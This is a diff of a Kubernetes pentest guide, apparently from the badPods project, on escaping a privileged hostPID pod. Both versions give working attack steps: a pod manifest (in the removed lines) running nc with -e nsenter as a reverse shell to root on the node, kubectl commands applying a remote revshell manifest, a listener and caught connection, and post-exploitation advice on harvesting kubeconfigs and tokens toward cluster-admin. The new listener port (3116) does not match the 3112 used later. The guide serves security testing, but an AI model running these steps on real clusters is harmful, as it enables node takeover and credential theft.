@@ -1,100 +1,47 @@
-# You can create a pod with privileged: true + hostPID
+# Bad Pod #2: Privileged and hostPID
 
-If you have `privileged=true` and `hostPID` available to you, you can use the `nsenter` command in the pod to enter PID=1 on the host, which allows also you gain a root shell on the host, which provides multiple potential paths to cluster-admin. 
+In this scenario, the only thing that changes from the everything-allowed pod is how you gain root access to the host. Rather than chrooting to the host’s filesystem, you can use `nsenter` to get a root shell on the node running your pod.  
 
-One promising privesc path is available if you can schedule your pod to run on the control plane node using the nodeName selector (not possible in most cloud hosted k8s environments). Even if you can only schedule your pod on the worker node, you can access the node's kubelet credentials or you can create mirror/static pods in any namespace. You can also access any secret mounted within any pod on the node you are on. **In a production cluster, even on a worker node, there is usually at least one pod that has a `token` mounted that is bound to a `service account` that is bound to a `clusterrolebinding`, that gives you access to do things like create pods or view secrets in all namespaces**.  
+Why does it work? 
 
+* **Privileged** - The `privileged: true`  container-level security context breaks down almost all of walls that containers are supposed to provide. The PID namespace is one of the few walls that stands, however. Without `hostPID`, `nsenter` would only work to enter the namespaces of a process running within the container. For more examples on what you can do if you only have privileged: true, refer to the next example Bad Pod #3: Privileged Only. 
+* **Privileged + HostPID** - When both `hostPID: true` and `privileged: true` are set, the pod can see all of the processes on the host, and you can enter the init system (PID 1) on the host, and execute your shell on the node. 
+  
+Once you are root on the host, the privilege escalation paths are all the same as described in Bad Pod # 1: Everything-allowed
 
 # Pod Creation
-
 ## Create a pod you can exec into
-```yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: priv-and-hostpid-exec-pod
-  labels: 
-    app: pentest
-spec:
-  hostPID: true
-  containers:
-  - name: priv-and-hostpid-exec-pod
-    image: ubuntu
-    command: [ "nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash" ]
-    tty: true
-    securityContext:
-      privileged: true
-  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
-  ```
-[pod-priv-and-hostpid.yaml](pod-priv-and-hostpid.yaml)
-
-#### Option 1: Create pod from local yaml 
+Create pod
 ```bash
-kubectl apply -f pod-priv-and-hostpid.yaml  
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv-and-hostpid/pod/priv-and-hostpid-revshell-pod.yaml  
 ```
-#### Option 2: Create pod from github hosted yaml
-```
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-priv-and-hostpid.yaml  
-```
-
-#### Exec into pod 
+Exec into pod 
 ```bash
-kubectl -n [namespace] exec -it pod-priv-and-hostpid -- bash
-```
-
-#### Use nsenter to gain full root access on the node
-```bash
-nsenter --target 1 --mount --uts --ipc --net --pid -- bash
+kubectl exec -it pod-priv-and-hostpid -- bash
 ```
 
 ## Or, create a reverse shell pod
-```yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: priv-and-hostpid-revshell
-  labels:
-    app: pentest
-spec:
-  hostPID: true
-  containers:
-  - name: priv-and-hostpid-revshell
-    image: busybox
-    securityContext:
-      privileged: true
-    volumeMounts:
-    - mountPath: /host
-      name: noderoot
-    command: [ "/bin/nc", "$HOST", "$PORT", "-e", "/bin/nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "/bin/bash"]
-  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
-  volumes:
-  - name: noderoot
-    hostPath:
-      path: /
-```
-[pod-priv-and-hostpid-revshell.yaml](pod-priv-and-hostpid-revshell.yaml)
+## Reverse shell pod
 
-#### Set up listener
+Set up listener
 ```bash
-nc -nvlp 3112
+nc -nvlp 3116
 ```
 
-#### Create the pod
+Create pod from local manifest without modifying it by using env variables and envsubst
 ```bash
-# Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
-HOST="10.0.0.1" PORT="3112" envsubst < ./yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3112" envsubst < ./manifests/priv-and-hostpid/pod/priv-and-hostpid-revshell-pod.yaml | kubectl apply -f -
 ```
 
-#### Catch the shell and chroot to /host 
+Catch the shell and chroot to /host 
 ```bash
-~ nc -nvlp 3112
+$ nc -nvlp 3112
 Listening on 0.0.0.0 3112
 Connection received on 10.0.0.162 42035
 ```
-
 # Post exploitation
 
-You now have root access to the node. Here are some next steps: 
+You now have a root shell on the node. Here are some next steps: 
 
 #### Look for kubeconfig's in the host filesystem 
 If you are lucky, you will find a cluster-admin config with full access to everything (not so lucky here on this GKE node)
